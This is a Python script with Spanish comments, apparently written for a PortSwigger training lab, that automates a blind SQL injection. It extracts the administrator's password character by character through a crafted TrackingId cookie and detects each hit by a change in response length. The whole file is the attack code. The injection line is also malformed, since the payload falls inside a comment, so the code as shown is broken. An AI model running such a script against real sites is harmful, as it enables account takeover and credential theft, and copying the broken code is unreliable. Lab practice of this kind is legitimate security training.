#!/usr/bin/python3 

import sys, signal, requests, string, time

def def_handler(sig, frame):
    print("\n[!] Saliendo ...\n")
    sys.exit(1)


# Change This
url = ""
characters = string.digits + string.ascii_lowercase

def getPassword():
    print("\n1. Blind SQLi PortSwigger")
    print("\n[*] Recuperando contraseña: ", end='')
    time.sleep(0.2)
    password = ""

    for position in range(1, 21):
        found_character = False

        for character in characters:
            cookies = {
                "TrackingId": "" #Change This and (select substring(password,%d,1)+from users where username='administrator' limit 1)='%s'--" % (position, character),
                "session": ""#Change This 
            }
            r = requests.get(url, cookies=cookies)
            content_length = len(r.content)

            if content_length != 14326:
                password += character
                print(character, end='')
                sys.stdout.flush()
                found_character = True
                break

        if not found_character:
            break  # Salir del bucle si no se encuentra un carácter

    print("\n[+] Contraseña recuperada exitosamente!\n")
    time.sleep(0.5)
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    getPassword()
